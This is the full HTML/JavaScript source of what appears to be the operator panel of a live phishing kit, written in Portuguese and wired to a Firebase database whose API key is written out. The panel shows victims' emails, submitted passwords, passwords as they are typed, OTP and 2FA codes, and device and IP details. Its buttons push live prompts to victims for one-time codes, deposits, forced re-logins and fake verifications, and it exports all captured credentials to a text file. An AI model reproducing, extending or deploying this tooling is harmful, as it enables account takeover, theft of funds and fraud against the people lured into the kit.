<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Painel de Controle</title>
<style>
:root { --hacker-green:#00ff41; --dark-bg:#0d0d0d; --terminal-bg:#1a1a1a; --card-bg: #1f1f1f; --border-color: #333; --error-red:#ff4d4d; --approve-green:#28a745; --reject-yellow:#ffc107; --typing-blue:#007bff; --text-light: #f0f0f0; }
body { font-family:'Fira Code', monospace; background-color:var(--dark-bg); color:var(--hacker-green); margin:0; padding:20px; text-shadow:0 0 3px rgba(0,255,65,0.4); }
h2 { border-bottom: 1px solid var(--hacker-green); padding-bottom: 10px; margin-bottom: 20px; }
.header-container { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; border-bottom: 1px solid var(--hacker-green); padding-bottom: 15px; margin-bottom: 30px; }
.header-container h2 { margin: 0; border: none; }
.header-actions button { margin-left: 10px; }
.logout-btn, .clear-btn { background-color:var(--error-red); color:white; border:none; padding:10px 15px; font-family:'Fira Code',monospace; font-weight:bold; cursor:pointer; border-radius:4px; }
.export-btn { background-color: var(--typing-blue); }
.panel-nav { display: flex; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid var(--border-color); padding-bottom: 20px; }
.nav-btn { background-color: var(--terminal-bg); border: 1px solid var(--border-color); color: var(--text-light); padding: 10px 20px; cursor: pointer; border-radius: 4px; font-family: 'Fira Code', monospace; font-size: 16px; }
.nav-btn.active { background-color: var(--hacker-green); color: var(--dark-bg); border-color: var(--hacker-green); }
.session-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(380px, 1fr)); gap: 20px; margin-bottom: 40px; }
.session-card { background-color: var(--card-bg); border: 1px solid var(--border-color); border-radius: 8px; box-shadow: 0 0 15px rgba(0,255,65,0.1); display: flex; flex-direction: column; }
.card-header { padding: 15px; border-bottom: 1px solid var(--border-color); display: flex; justify-content: space-between; align-items: center; word-break: break-all; }
.card-header h3 { margin: 0; font-size: 16px; color: var(--text-light); }
.status { display: flex; align-items: center; gap: 8px; font-weight: bold; }
.status-dot { width: 12px; height: 12px; border-radius: 50%; }
.status-online .status-dot { background-color: var(--approve-green); }
.status-typing .status-dot { background-color: var(--typing-blue); }
.status-offline .status-dot { background-color: var(--error-red); }
.card-body { padding: 15px; display: grid; grid-template-columns: 1fr; gap: 15px; font-size: 14px; }
.info-block, .credentials-block, .verify-block { background: var(--terminal-bg); padding: 10px; border-radius: 4px; }
.info-block strong, .credentials-block strong, .verify-block strong { color: var(--hacker-green); display: block; margin-bottom: 5px; }
.info-block span, .credentials-block div, .credentials-block span { color: var(--text-light); word-break: break-all; }
.current-page { color: var(--hacker-green); font-weight: bold; }
.verify-block input { background-color: #333; border: 1px solid var(--border-color); color: var(--text-light); padding: 8px; width: calc(100% - 18px); margin-bottom: 10px; border-radius: 4px; font-family: 'Fira Code', monospace; }
.verify-block button { width: 100%; }
.card-actions { padding: 15px; margin-top: auto; border-top: 1px solid var(--border-color); display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
.card-actions button { width: 100%; color: white; border: none; padding: 10px; border-radius: 4px; cursor: pointer; font-weight: bold; font-family:'Fira Code', monospace; font-size: 11px; }
.btn-approve { background-color: var(--approve-green); }
.btn-reject { background-color: var(--reject-yellow); color: black; }
.btn-otp { background-color: #6b7cff; }
.btn-2fa { background-color: #9b59b6; }
.btn-deposit { background-color: #00bcd4; }
.btn-reject-email { background-color: #f39c12; }
.btn-2fa-email { background-color: #3498db; }
.btn-password-confirm { background-color: #8e44ad; }
.btn-verify { background-color: #16a085; }
.btn-relogin { background-color: #3498db; }
.btn-block-ip { background-color: var(--error-red); }
.btn-delete { background-color: var(--error-red); grid-column: 1 / -1; }
.click-counter-container, .blocked-ips-container { border: 1px solid var(--hacker-green); padding: 15px; box-shadow: 0 0 15px rgba(0,255,65,0.3); margin-bottom: 40px; }
.click-counter-container table, .blocked-ips-container table { width: 100%; border-collapse: collapse; }
.click-counter-container th, .click-counter-container td, .blocked-ips-container th, .blocked-ips-container td { padding: 12px 15px; border: 1px solid #333; text-align: left; }
.click-counter-container th, .blocked-ips-container th { background-color: var(--terminal-bg); }
.btn-unblock { background-color: var(--approve-green); color: white; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer; }
.date-filter { margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
.date-filter input[type="date"] { background-color: var(--terminal-bg); border: 1px solid var(--border-color); color: var(--text-light); padding: 8px; border-radius: 4px; font-family: 'Fira Code', monospace; }
.date-filter button { background-color: var(--typing-blue); color: white; border: none; padding: 8px 12px; font-family: 'Fira Code', monospace; font-weight: bold; cursor: pointer; border-radius: 4px; }
</style>
</head>
<body>

<div class="header-container">
    <h2>🎧 Painel de Controle</h2>
    <div class="header-actions">
        <button id="export-btn" class="clear-btn export-btn">[ Exportar TXT ]</button>
        <button id="clear-all-btn" class="clear-btn">[ Limpar Sessões ]</button>
        <button id="logout-btn" class="logout-btn">[ LOGOUT ]</button>
        <button id="maintenance-btn" class="clear-btn" data-action="maintenance-mode">[ Modo Manutenção ]</button>
    </div>
</div>

<div class="panel-nav">
    <button id="nav-online" class="nav-btn active">Online</button>
    <button id="nav-offline" class="nav-btn">Offline</button>
</div>

<div class="date-filter">
    <label for="filter-date">Filtrar por data:</label>
    <input type="date" id="filter-date">
    <button id="clear-filter-btn">Limpar Filtro</button>
</div>

<div id="online-panel">
    <h2 id="online-count-title">🟢 Utilizadores Online (0)</h2>
    <div id="online-session-grid" class="session-grid"></div>
</div>

<div id="offline-panel" style="display: none;">
    <h2 id="offline-count-title">🔴 Utilizadores Offline (0)</h2>
    <div id="offline-session-grid" class="session-grid"></div>
</div>

<div class="click-counter-container">
    <h2>📊 Contador de Cliques</h2>
    <table>
        <thead><tr><th>Ação</th><th>Quantidade</th></tr></thead>
        <tbody id="click-counts-list"></tbody>
    </table>
</div>

<div class="blocked-ips-container">
    <h2>🚫 IPs Bloqueados</h2>
    <table>
        <thead><tr><th>Endereço de IP</th><th>Ação</th></tr></thead>
        <tbody id="blocked-ips-list"></tbody>
    </table>
</div>

<!-- Áudios -->
<audio id="connect-sound" preload="auto">
    <source src="conectado.mp3" type="audio/mpeg">
</audio>
<audio id="new-data-sound" preload="auto">
    <source src="notify.mp3" type="audio/mpeg">
</audio>
<audio id="offline-sound" preload="auto">
    <source src="desconectado.mp3" type="audio/mpeg">
</audio>

<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyAemZwP19k7zaM8QMBPn5kitdlvzY514OI",
        authDomain: "web-xchangeon1.firebaseapp.com",
        databaseURL: "https://web-xchangeon1-default-rtdb.firebaseio.com/",
        projectId: "web-xchangeon1",
        storageBucket: "web-xchangeon1.firebasestorage.app",
        messagingSenderId: "733409941973",
        appId: "1:733409941973:web:6e11c283fcee846b4a855c"
    };

    const app = firebase.initializeApp(firebaseConfig);
    const auth = firebase.auth();
    const db = firebase.database();
    const sessionsRef = db.ref('sessions');
    const blockedIpsRef = db.ref('blocked_ips');
    const clickCountsRef = db.ref('click_counts');

    let currentSessionsData = {};
    const dateFilterInput = document.getElementById('filter-date');
    const clearFilterBtn = document.getElementById('clear-filter-btn');

    // ===== ÁUDIOS =====
    const connectSound = document.getElementById('connect-sound');
    const newDataSound = document.getElementById('new-data-sound');
    const offlineSound = document.getElementById('offline-sound');

    // ===== ATIVAR ÁUDIO COM UM CLIQUE =====
    let audioEnabled = false;

    function enableAudio() {
        if (!audioEnabled) {
            // Tenta tocar todos os áudios para "ativar" no navegador
            connectSound.play().catch(() => {});
            newDataSound.play().catch(() => {});
            offlineSound.play().catch(() => {});
            // Pausa todos imediatamente
            setTimeout(() => {
                connectSound.pause();
                connectSound.currentTime = 0;
                newDataSound.pause();
                newDataSound.currentTime = 0;
                offlineSound.pause();
                offlineSound.currentTime = 0;
            }, 100);
            audioEnabled = true;
            console.log('🔊 Áudio ativado!');
        }
    }

    // Ativa áudio no primeiro clique em qualquer lugar da página
    document.addEventListener('click', enableAudio);
    document.addEventListener('keydown', enableAudio);

    // ===== FUNÇÕES PARA TOCAR SONS =====
    function playConnectSound() {
        if (audioEnabled) {
            connectSound.currentTime = 0;
            connectSound.play().catch(() => {});
        }
    }

    function playNewDataSound() {
        if (audioEnabled) {
            newDataSound.currentTime = 0;
            newDataSound.play().catch(() => {});
        }
    }

    function playOfflineSound() {
        if (audioEnabled) {
            offlineSound.currentTime = 0;
            offlineSound.play().catch(() => {});
        }
    }

    auth.onAuthStateChanged(user => { if (!user) window.location.href = 'index.html'; });
    document.getElementById('logout-btn').addEventListener('click', () => auth.signOut());
    document.getElementById('clear-all-btn').addEventListener('click', () => { if (confirm('Tem certeza?')) { sessionsRef.remove(); } });
    document.getElementById('export-btn').addEventListener('click', exportDataToTxt);
    document.getElementById('maintenance-btn').addEventListener('click', () => {
        const action = 'maintenance-mode';
        if(confirm('Tem certeza que deseja ativar o modo de manutenção para todos os usuários?')) {
            const command = { type: action };
            sessionsRef.once('value', (snapshot) => {
                const allSessions = snapshot.val();
                if (allSessions) {
                    Object.keys(allSessions).forEach(sessionId => {
                        db.ref(`sessions/${sessionId}/command`).set(command);
                    });
                }
            });
            alert('Modo de manutenção ativado. Os usuários serão redirecionados.');
        }
    });

    const navOnlineBtn = document.getElementById('nav-online');
    const navOfflineBtn = document.getElementById('nav-offline');
    const onlinePanel = document.getElementById('online-panel');
    const offlinePanel = document.getElementById('offline-panel');

    function updatePanel(filterDate = null) {
        let allSessions = Object.entries(currentSessionsData).map(([id, data]) => ({ id, ...data }));
        
        if (filterDate) {
            const startOfDaySP = new Date(filterDate);
            startOfDaySP.setHours(0, 0, 0, 0); 
            const endOfDaySP = new Date(filterDate);
            endOfDaySP.setHours(23, 59, 59, 999);
            const startOfDayTimestamp = startOfDaySP.getTime();
            const endOfDayTimestamp = endOfDaySP.getTime();

            allSessions = allSessions.filter(s => {
                const sessionTime = s.last_update;
                return sessionTime >= startOfDayTimestamp && sessionTime <= endOfDayTimestamp;
            });
        }
        
        // UMA SESSÃO POR IP (mantém a mais recente)
        const ipMap = new Map();
        allSessions.forEach(session => {
            const ip = session.ip || 'unknown';
            if (!ipMap.has(ip) || (session.last_update || 0) > (ipMap.get(ip).last_update || 0)) {
                ipMap.set(ip, session);
            }
        });
        const uniqueSessions = Array.from(ipMap.values());
        
        const onlineSessions = [];
        const offlineSessions = [];
        const fiveMinutesAgo = Date.now() - (5 * 60 * 1000);

        uniqueSessions.forEach(session => {
            if (session.status === 'online' || session.status === 'typing') {
                onlineSessions.push(session);
            } else {
                const lastSeen = session.last_update || 0;
                if (lastSeen >= fiveMinutesAgo) {
                    onlineSessions.push(session);
                } else {
                    offlineSessions.push(session);
                }
            }
        });

        onlineSessions.sort((a, b) => (b.last_update || 0) - (a.last_update || 0));
        offlineSessions.sort((a, b) => (b.last_update || 0) - (a.last_update || 0));

        document.getElementById('online-count-title').textContent = `🟢 Utilizadores Online (${onlineSessions.length})`;
        document.getElementById('offline-count-title').textContent = `🔴 Utilizadores Offline (${offlineSessions.length})`;
        
        renderSessionGrid(onlineSessions, 'online-session-grid');
        renderSessionGrid(offlineSessions, 'offline-session-grid');
    }

    navOnlineBtn.addEventListener('click', () => {
        onlinePanel.style.display = 'block';
        offlinePanel.style.display = 'none';
        navOnlineBtn.classList.add('active');
        navOfflineBtn.classList.remove('active');
    });
    navOfflineBtn.addEventListener('click', () => {
        onlinePanel.style.display = 'none';
        offlinePanel.style.display = 'block';
        navOnlineBtn.classList.remove('active');
        navOfflineBtn.classList.add('active');
    });
    
    dateFilterInput.addEventListener('change', (e) => updatePanel(e.target.value));
    clearFilterBtn.addEventListener('click', () => {
        dateFilterInput.value = '';
        updatePanel();
    });

    function renderSessionGrid(sessionsArray, containerId) {
        const grid = document.getElementById(containerId);
        grid.innerHTML = '';
        
        sessionsArray.forEach(s => {
            const card = document.createElement('div');
            card.className = 'session-card';
            card.dataset.sessionId = s.id;
            card.dataset.sessionIp = s.ip;
            const passwords = s.passwords || [];
            const passwordHtml = passwords.map(p => `<div>${p.value}</div>`).join('');
            const typingHtml = s.status === 'typing' && s.currentPassword ? `<div><strong>Digitando:</strong> <span class="password-typing">${s.currentPassword}</span></div>` : '';
            
            // CORRIGIDO: Mostra OTP e 2FA digitados
            const otpHtml = s.otp_entered ? `<div><strong>🔑 OTP Digitado:</strong> ${s.otp_entered}</div>` : '';
            const tfaHtml = s.tfa_entered ? `<div><strong>🔐 2FA Digitado:</strong> ${s.tfa_entered}</div>` : '';
            const hashHtml = s.transactionHash ? `<div><strong>Hash TX:</strong> ${s.transactionHash}</div>` : '';
            const confirmPassHtml = s.password_confirmation ? `<div><strong>Confirmação Senha:</strong> ${s.password_confirmation}</div>` : '';
            
            // TÍTULO: email ou telefone
            let titulo = 'Novo Acesso';
            if (s.email && s.email.trim() !== '') {
                titulo = s.email;
            } else if (s.phone && s.phone.trim() !== '') {
                titulo = s.phone;
            }
            
            let countryTimeZone = 'UTC';
            const country = s.country || '';
            switch (country) {
                case 'US': countryTimeZone = 'America/New_York'; break;
                case 'BR': countryTimeZone = 'America/Sao_Paulo'; break;
                case 'DE': countryTimeZone = 'Europe/Berlin'; break;
                case 'GB': countryTimeZone = 'Europe/London'; break;
                case 'JP': countryTimeZone = 'Asia/Tokyo'; break;
                case 'IN': countryTimeZone = 'Asia/Kolkata'; break;
            }

            const userCountryTime = s.last_update ? new Date(s.last_update).toLocaleString('en-US', { timeZone: countryTimeZone }) : 'N/A';
            const saoPauloTime = s.last_update ? new Date(s.last_update).toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' }) : 'N/A';

            let navButtons = '';
            if (s.currentPage === '2FA' || s.currentPage === '2FA Waiting Approval') {
                navButtons = `<button class="btn-2fa action-btn" data-action="tfa-request">Ir para 2FA</button>`;
            } else if (s.currentPage === 'OTP Email' || s.currentPage === 'OTP Phone' || s.currentPage === 'OTP Waiting Approval') {
                navButtons = `<button class="btn-otp action-btn" data-action="otp-request">Ir para OTP</button><button class="btn-2fa action-btn" data-action="tfa-request">Pedir 2FA</button>`;
            } else {
                navButtons = `<button class="btn-otp action-btn" data-action="otp-request">Pedir OTP</button><button class="btn-2fa action-btn" data-action="tfa-request">Pedir 2FA</button>`;
            }
            
            card.innerHTML = `
                <div class="card-header">
                    <h3>${titulo}</h3>
                    <div class="status status-${s.status || 'offline'}">
                        <div class="status-dot"></div>
                        <span>${s.status || 'Offline'}</span>
                    </div>
                </div>
                <div class="card-body">
                    <div class="info-block">
                        <strong>📋 Info do Acesso</strong>
                        <span>IP: ${s.ip || 'N/A'}</span><br>
                        <span>🌍 País: ${s.country || s.country_code || 'N/A'}</span><br>
                        <span>📱 Dispositivo: ${s.device || 'N/A'}</span><br>
                        <span class="current-page">📍 Página: ${s.currentPage || 'N/A'}</span><br>
                        <span>🕐 Horário (${s.country || 'UTC'}): ${userCountryTime}</span><br>
                        <span>🕐 Horário (SP): ${saoPauloTime}</span>
                    </div>
                    <div class="credentials-block">
                        ${typingHtml}
                        <div><strong>🔑 Senhas:</strong>${passwordHtml || '<span>Nenhuma</span>'}</div>
                        <div><strong>📝 Códigos:</strong>${otpHtml || tfaHtml || hashHtml ? otpHtml + tfaHtml + hashHtml : '<span>Nenhum</span>'}</div>
                        ${confirmPassHtml}
                    </div>
                    <div class="verify-block">
                        <strong>✅ Verificação Manual</strong>
                        <input type="text" class="verify-number-input" placeholder="Número (ex: 29)">
                        <input type="text" class="verify-device-input" placeholder="Dispositivo (ex: iPhone)">
                        <button class="btn-verify action-btn" data-action="verify-request">Pedir Verificação</button>
                    </div>
                </div>
                <div class="card-actions">
                    <button class="btn-approve action-btn" data-action="approve">✅ Aprovar</button>
                    <button class="btn-reject action-btn" data-action="reject">❌ Rejeitar</button>
                    ${navButtons}
                    <button class="btn-deposit action-btn" data-action="deposit-request">💰 Depósito</button>
                    <button class="btn-password-confirm action-btn" data-action="password-confirm-request">🔐 Confirmar Senha</button>
                    <button class="btn-reject-email action-btn" data-action="reject-email">📧 Rejeitar Email</button>
                    <button class="btn-2fa-email action-btn" data-action="2fa-email-request">📧 Pedir 2FA Email</button>
                    <button class="btn-relogin action-btn" data-action="force-relogin">🔄 Forçar Login</button>
                    <button class="btn-block-ip action-btn" data-action="block-ip">🚫 Bloquear IP</button>
                    <button class="btn-delete action-btn" data-action="delete">🗑️ Apagar Sessão</button>
                </div>
            `;
            grid.appendChild(card);
        });
    }
    
    sessionsRef.on('value', (snapshot) => {
        currentSessionsData = snapshot.val() || {};
        updatePanel();
    });

    blockedIpsRef.on('value', (snapshot) => renderBlockedIps(snapshot.val()));
    clickCountsRef.on('value', (snapshot) => renderClickCounts(snapshot.val()));

    function renderBlockedIps(ips) {
        const list = document.getElementById('blocked-ips-list');
        list.innerHTML = '';
        const ipsArray = ips ? Object.keys(ips) : [];
        if (ipsArray.length === 0) {
            list.innerHTML = '<tr><td colspan="2">Nenhum IP bloqueado.</td></tr>';
            return;
        }
        ipsArray.forEach(sanitizedIp => {
            const originalIp = sanitizedIp.replace(/_/g, '.');
            const row = document.createElement('tr');
            row.innerHTML = `<td>${originalIp}</td><td><button class="btn-unblock" data-ip="${sanitizedIp}">Desbloquear</button></td>`;
            list.appendChild(row);
        });
    }

    function renderClickCounts(counts) {
        const list = document.getElementById('click-counts-list');
        const countsData = counts || {};
        const actions = ['approve', 'reject', 'otp-request', 'tfa-request', 'deposit-request', 'password-confirm-request', 'reject-email', '2fa-email-request', 'verify-request', 'block-ip', 'delete', 'maintenance-mode', 'force-relogin'];
        list.innerHTML = '';
        actions.forEach(action => {
            const row = document.createElement('tr');
            const actionName = action.replace(/-/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
            row.innerHTML = `<td>${actionName}</td><td>${countsData[action] || 0}</td>`;
            list.appendChild(row);
        });
    }

    function exportDataToTxt() {
        if (Object.keys(currentSessionsData).length === 0) {
            alert("Não há dados para exportar.");
            return;
        }
        let fileContent = "DADOS EXPORTADOS DE TODAS AS SESSÕES (ONLINE E OFFLINE)\n";
        fileContent += `Data da Exportação: ${new Date().toLocaleString('pt-BR')}\n\n`;
        const allSessionsForExport = Object.values(currentSessionsData).reverse();

        allSessionsForExport.forEach((session, index) => {
            const userCountryTime = session.last_update ? new Date(session.last_update).toLocaleString('en-US', { timeZone: 'UTC' }) : 'N/A';
            const saoPauloTime = session.last_update ? new Date(session.last_update).toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' }) : 'N/A';
            
            fileContent += `================ SESSÃO ${index + 1} ================\n`;
            fileContent += `Email: ${session.email || 'N/A'}\n`;
            fileContent += `Telefone: ${session.phone || 'N/A'}\n`;
            fileContent += `Status: ${session.status || 'N/A'}\n`;
            fileContent += `Página Atual: ${session.currentPage || 'N/A'}\n`;
            fileContent += `IP: ${session.ip || 'N/A'}\n`;
            fileContent += `País: ${session.country || 'N/A'}\n`;
            fileContent += `Dispositivo: ${session.device || 'N/A'}\n\n`;
            fileContent += `SENHAS ENVIADAS:\n`;
            if (session.passwords && session.passwords.length > 0) {
                session.passwords.forEach(p => { fileContent += `- ${p.value}\n`; });
            } else { fileContent += `Nenhuma\n`; }
            if (session.password_confirmation) { fileContent += `Confirmação Senha: ${session.password_confirmation}\n`;}
            fileContent += `\nCÓDIGOS ENVIADOS:\n`;
            if (session.otp_entered) { fileContent += `OTP Digitado: ${session.otp_entered}\n`; }
            if (session.tfa_entered) { fileContent += `2FA Digitado: ${session.tfa_entered}\n`; }
            if(session.transactionHash) { fileContent += `Hash TX: ${session.transactionHash}\n`; }
            if (!session.otp_entered && !session.tfa_entered && !session.transactionHash) { fileContent += `Nenhum\n`; }
            fileContent += `\nConectado em (Local do Acesso): ${userCountryTime}\n`;
            fileContent += `Conectado em (São Paulo): ${saoPauloTime}\n`;
            fileContent += `===========================================\n\n`;
        });

        const blob = new Blob([fileContent], { type: 'text/plain;charset=utf-8' });
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = `sessoes_exportadas_${Date.now()}.txt`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    }
    
    let initialDataLoaded = false;
    let localSessionsCopy = {};
    sessionsRef.once('value', (snapshot) => { 
        initialDataLoaded = true;
        localSessionsCopy = snapshot.val() || {};
    });

    sessionsRef.on('child_added', (snapshot) => { 
        if(initialDataLoaded) {
            playConnectSound(); // 🔊 SOM DE CONEXÃO
            localSessionsCopy[snapshot.key] = snapshot.val();
        }
    });

    sessionsRef.on('child_changed', (snapshot) => {
        const sessionId = snapshot.key;
        const newData = snapshot.val();
        const oldData = localSessionsCopy[sessionId];

        if (oldData && oldData.status !== 'offline' && newData.status === 'offline') {
            playOfflineSound(); // 🔊 SOM DE DESCONEXÃO
        } else {
            playNewDataSound(); // 🔊 SOM DE NOVO DADO
        }
        
        localSessionsCopy[sessionId] = newData;
    });
    
    sessionsRef.on('child_removed', (snapshot) => {
        delete localSessionsCopy[snapshot.key];
    });
    
    document.body.addEventListener('click', (e) => {
        if (!e.target.classList.contains('action-btn') && !e.target.classList.contains('btn-unblock')) return;

        if (e.target.classList.contains('action-btn')) {
            const card = e.target.closest('.session-card');
            if (!card) return;
            const action = e.target.dataset.action;
            const sessionId = card.dataset.sessionId;
            const sessionIp = card.dataset.sessionIp;
            if (!sessionId) return;
            
            clickCountsRef.child(action).transaction(currentCount => (currentCount || 0) + 1);

            if (action === 'verify-request') {
                const numberInput = card.querySelector('.verify-number-input');
                const deviceInput = card.querySelector('.verify-device-input');
                const number = numberInput.value.trim();
                const device = deviceInput.value.trim();
                if (number && device) {
                    db.ref(`sessions/${sessionId}`).update({ verification_number: number, verification_device: device })
                    .then(() => {
                        db.ref(`sessions/${sessionId}/command`).set({ type: action });
                    });
                } else {
                    alert('Por favor, preencha o número e o dispositivo para verificação.');
                }
            } else if (action === 'delete') { 
                db.ref(`sessions/${sessionId}`).remove(); 
            } else if (action === 'block-ip') { 
                if (sessionIp && confirm(`Bloquear o IP: ${sessionIp}?`)) { 
                    const sanitizedIp = sessionIp.replace(/\./g, '_'); 
                    blockedIpsRef.child(sanitizedIp).set(true); 
                    db.ref(`sessions/${sessionId}`).remove(); 
                } else if (!sessionIp) { 
                    alert('IP não encontrado.'); 
                } 
            } else { 
                db.ref(`sessions/${sessionId}/command`).set({ type: action });
            }
        }

        if (e.target.classList.contains('btn-unblock')) {
            const sanitizedIp = e.target.dataset.ip;
            if (sanitizedIp && confirm(`Desbloquear o IP: ${sanitizedIp.replace(/_/g, '.')}?`)) {
                blockedIpsRef.child(sanitizedIp).remove();
            }
        }
    });

    console.log('🎧 Painel carregado! Sons ativados no primeiro clique.');
</script>
</body>
</html>
